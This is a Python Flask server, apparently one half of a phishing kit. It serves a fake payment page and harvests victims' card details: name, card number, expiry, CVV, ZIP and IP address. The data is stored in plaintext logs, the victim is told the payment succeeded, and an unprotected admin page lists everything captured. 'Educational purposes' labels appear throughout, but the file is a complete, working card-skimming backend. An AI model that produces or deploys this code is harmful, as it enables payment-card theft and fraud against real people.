from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import os
import json
from datetime import datetime
import logging

app = Flask(__name__)
CORS(app)

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# File to store captured data
DATA_FILE = "captured_payments.txt"

# HTML template for the fake payment page (you can also load from file)
# This is the same as payment.html above - you can either save it separately or include here

@app.route('/')
def index():
    """Serve the fake payment page"""
    try:
        with open('payment.html', 'r') as f:
            return render_template_string(f.read())
    except FileNotFoundError:
        return "Payment page not found. Please ensure payment.html exists.", 404

@app.route('/submit-payment', methods=['POST'])
def submit_payment():
    """Handle payment data submission"""
    try:
        data = request.get_json()
        
        # Add timestamp and IP address
        data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data['ip_address'] = request.remote_addr
        
        # Log the received data (for debugging)
        logger.info(f"Received payment data: {data}")
        
        # Save to file
        with open(DATA_FILE, 'a') as f:
            f.write(json.dumps(data, indent=2))
            f.write('\n' + '='*50 + '\n')
        
        # Also save in a more readable format
        with open('readable_log.txt', 'a') as f:
            f.write(f"\n[{data['timestamp']}] New Payment Captured\n")
            f.write(f"IP: {data['ip_address']}\n")
            f.write(f"Cardholder: {data.get('cardholderName', 'N/A')}\n")
            f.write(f"Card Number: {data.get('cardNumber', 'N/A')}\n")
            f.write(f"Expiry: {data.get('expiryDate', 'N/A')}\n")
            f.write(f"CVV: {data.get('cvv', 'N/A')}\n")
            f.write(f"ZIP: {data.get('zipCode', 'N/A')}\n")
            f.write(f"Amount: ${data.get('amount', 'N/A')}\n")
            f.write('-'*50 + '\n')
        
        return jsonify({"message": "Payment processed successfully", "status": "success"}), 200
        
    except Exception as e:
        logger.error(f"Error processing payment: {str(e)}")
        return jsonify({"message": "Error processing payment", "status": "error"}), 500

@app.route('/admin/view-data', methods=['GET'])
def view_data():
    """Simple admin endpoint to view captured data (for educational purposes)"""
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                content = f.read()
            return f"<pre>{content}</pre>"
        else:
            return "No data captured yet."
    except Exception as e:
        return f"Error reading data: {str(e)}"

@app.route('/admin/clear-data', methods=['POST'])
def clear_data():
    """Clear captured data (for educational purposes)"""
    try:
        if os.path.exists(DATA_FILE):
            os.remove(DATA_FILE)
        if os.path.exists('readable_log.txt'):
            os.remove('readable_log.txt')
        return jsonify({"message": "Data cleared successfully"}), 200
    except Exception as e:
        return jsonify({"message": f"Error clearing data: {str(e)}"}), 500

if __name__ == '__main__':
    print("="*60)
    print("Phishing Simulation Server Starting...")
    print("="*60)
    print("\nEndpoints:")
    print("  - Main page: http://localhost:8000")
    print("  - View captured data: http://localhost:8000/admin/view-data")
    print("  - Clear data (POST): http://localhost:8000/admin/clear-data")
    print("\nCaptured data will be saved to:")
    print(f"  - {DATA_FILE}")
    print("  - readable_log.txt")
    print("\n⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️")
    print("="*60)
    
    # Ensure the data file exists
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            f.write("=== Captured Payment Data ===\n\n")
    
    app.run(debug=True, port=8000)
